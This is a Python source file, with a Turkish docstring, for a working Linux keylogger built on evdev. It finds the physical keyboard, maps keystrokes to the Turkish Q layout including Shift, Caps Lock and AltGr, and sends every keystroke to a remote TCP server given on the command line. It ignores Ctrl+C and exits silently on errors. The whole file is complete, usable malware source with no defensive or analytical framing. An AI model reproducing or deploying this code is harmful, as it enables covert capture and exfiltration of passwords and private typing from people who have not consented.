"""
Türkçe Q klavye düzeni için bir keylogger örneği. Bu program, Linux'ta evdev kütüphanesini kullanarak fiziksel klavye girişlerini dinler ve tuş vuruşlarını belirtilen bir TCP sunucusuna gönderir.
Kullanım:
    python keylogger.py <sunucu_ip> <sunucu_port>
Notlar:
- Bu program sadece Linux'ta çalışır ve evdev kütüphanesine ihtiyaç duyar. Kurulum için: pip install evdev
- Program, fiziksel klavye cihazını otomatik olarak bulmaya çalışır. Eğer birden fazla klavye varsa, ilk bulunan klavye cihazını kullanır.
- Shift, Caps Lock ve AltGr gibi modifiyer tuşları desteklenir ve Türkçe Q karakterlerine uygun şekilde çevrilir.
- Gönderilen tuş vuruşları UTF-8 olarak kodlanır, bu nedenle sunucu tarafında da UTF-8 olarak alınmalıdır.
"""

import socket
import sys
import signal
import evdev

KEY_MAP = {
    "KEY_Q": "q", "KEY_W": "w", "KEY_E": "e", "KEY_R": "r", "KEY_T": "t",
    "KEY_Y": "y", "KEY_U": "u", "KEY_I": "ı", "KEY_O": "o", "KEY_P": "p",
    "KEY_A": "a", "KEY_S": "s", "KEY_D": "d", "KEY_F": "f", "KEY_G": "g",
    "KEY_H": "h", "KEY_J": "j", "KEY_K": "k", "KEY_L": "l",
    "KEY_Z": "z", "KEY_X": "x", "KEY_C": "c", "KEY_V": "v", "KEY_B": "b",
    "KEY_N": "n", "KEY_M": "m",
    "KEY_LEFTBRACE": "ğ", "KEY_RIGHTBRACE": "ü",
    "KEY_SEMICOLON": "ş", "KEY_APOSTROPHE": "i",
    "KEY_COMMA": "ö", "KEY_DOT": "ç", "KEY_SLASH": ".",
    "KEY_BACKSLASH": ",",
    "KEY_GRAVE": '"',
    "KEY_102ND": "<",
    "KEY_1": "1", "KEY_2": "2", "KEY_3": "3", "KEY_4": "4",
    "KEY_5": "5", "KEY_6": "6", "KEY_7": "7", "KEY_8": "8",
    "KEY_9": "9", "KEY_0": "0",
    "KEY_MINUS": "*", "KEY_EQUAL": "-",
    "KEY_SPACE": " ", "KEY_ENTER": "\n", "KEY_TAB": "\t",
}

SHIFT_KEY_MAP = {
    "KEY_Q": "Q", "KEY_W": "W", "KEY_E": "E", "KEY_R": "R", "KEY_T": "T",
    "KEY_Y": "Y", "KEY_U": "U", "KEY_I": "I", "KEY_O": "O", "KEY_P": "P",
    "KEY_A": "A", "KEY_S": "S", "KEY_D": "D", "KEY_F": "F", "KEY_G": "G",
    "KEY_H": "H", "KEY_J": "J", "KEY_K": "K", "KEY_L": "L",
    "KEY_Z": "Z", "KEY_X": "X", "KEY_C": "C", "KEY_V": "V", "KEY_B": "B",
    "KEY_N": "N", "KEY_M": "M",
    "KEY_LEFTBRACE": "Ğ", "KEY_RIGHTBRACE": "Ü",
    "KEY_SEMICOLON": "Ş", "KEY_APOSTROPHE": "İ",
    "KEY_COMMA": "Ö", "KEY_DOT": "Ç", "KEY_SLASH": ":",
    "KEY_BACKSLASH": ";",
    "KEY_GRAVE": "é",
    "KEY_102ND": ">",
    "KEY_1": "!", "KEY_2": "'", "KEY_3": "^", "KEY_4": "+",
    "KEY_5": "%", "KEY_6": "&", "KEY_7": "/", "KEY_8": "(",
    "KEY_9": ")", "KEY_0": "=",
    "KEY_MINUS": "?", "KEY_EQUAL": "_",
    "KEY_SPACE": " ", "KEY_ENTER": "\n", "KEY_TAB": "\t",
}

ALTGR_KEY_MAP = {
    "KEY_Q": "@", "KEY_E": "€",
    "KEY_2": "£", "KEY_3": "#", "KEY_4": "$",
    "KEY_7": "{", "KEY_8": "[", "KEY_9": "]", "KEY_0": "}",
    "KEY_MINUS": "\\",
    "KEY_RIGHTBRACE": "~",
    "KEY_BACKSLASH": "`",
    "KEY_102ND": "|",
}

SPECIAL_KEYS = {
    "KEY_BACKSPACE": "[BS]",
    "KEY_DELETE": "[DEL]",
    "KEY_ESC": "[ESC]",
    "KEY_UP": "[UP]",
    "KEY_DOWN": "[DOWN]",
    "KEY_LEFT": "[LEFT]",
    "KEY_RIGHT": "[RIGHT]",
    "KEY_HOME": "[HOME]",
    "KEY_END": "[END]",
    "KEY_PAGEUP": "[PGUP]",
    "KEY_PAGEDOWN": "[PGDN]",
    "KEY_INSERT": "[INS]",
    "KEY_F1": "[F1]", "KEY_F2": "[F2]", "KEY_F3": "[F3]",
    "KEY_F4": "[F4]", "KEY_F5": "[F5]", "KEY_F6": "[F6]",
    "KEY_F7": "[F7]", "KEY_F8": "[F8]", "KEY_F9": "[F9]",
    "KEY_F10": "[F10]", "KEY_F11": "[F11]", "KEY_F12": "[F12]",
}

MODIFIER_KEYS = {
    "KEY_LEFTSHIFT", "KEY_RIGHTSHIFT",
    "KEY_LEFTCTRL", "KEY_RIGHTCTRL",
    "KEY_LEFTALT", "KEY_RIGHTALT",
    "KEY_LEFTMETA", "KEY_RIGHTMETA",
    "KEY_CAPSLOCK",
}

def find_keyboard():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for dev in devices:
        caps = dev.capabilities(verbose=True)
        for (etype, _), codes in caps.items():
            if etype == "EV_KEY":
                names = [c[0] if isinstance(c[0], str) else c[0][0] for c in codes]
                if "KEY_A" in names and "KEY_ENTER" in names:
                    return dev
    return None


def resolve_key(name, shift, caps, altgr):
    """Fiziksel tuş adını Turkish-Q karakter değerine çevirir."""
    if name in SPECIAL_KEYS:
        return SPECIAL_KEYS[name]

    if altgr and name in ALTGR_KEY_MAP:
        return ALTGR_KEY_MAP[name]

    is_letter = name.startswith("KEY_") and len(name) == 5 and name[4:].isalpha()
    effective_shift = shift ^ caps if is_letter else shift

    if effective_shift and name in SHIFT_KEY_MAP:
        return SHIFT_KEY_MAP[name]

    return KEY_MAP.get(name)

def stream_keys(host, port):
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    kb = find_keyboard()
    if not kb:
        sys.exit(1)

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))

            shift_held = False
            caps_on = False
            altgr_held = False

            for event in kb.read_loop():
                if event.type != evdev.ecodes.EV_KEY:
                    continue

                name = evdev.ecodes.KEY.get(event.code, f"KEY_{event.code}")
                if isinstance(name, list):
                    name = name[0]

                if name in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                    shift_held = event.value != 0
                    continue
                if name == "KEY_RIGHTALT":
                    altgr_held = event.value != 0
                    continue
                if name == "KEY_CAPSLOCK" and event.value == 1:
                    caps_on = not caps_on
                    continue
                if name in MODIFIER_KEYS:
                    continue

                if event.value != 1:
                    continue

                ch = resolve_key(name, shift_held, caps_on, altgr_held)
                if ch:
                    s.sendall(ch.encode("utf-8"))

    except (BrokenPipeError, ConnectionRefusedError,
            ConnectionResetError, ConnectionAbortedError, OSError):
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)

    stream_keys(sys.argv[1], int(sys.argv[2]))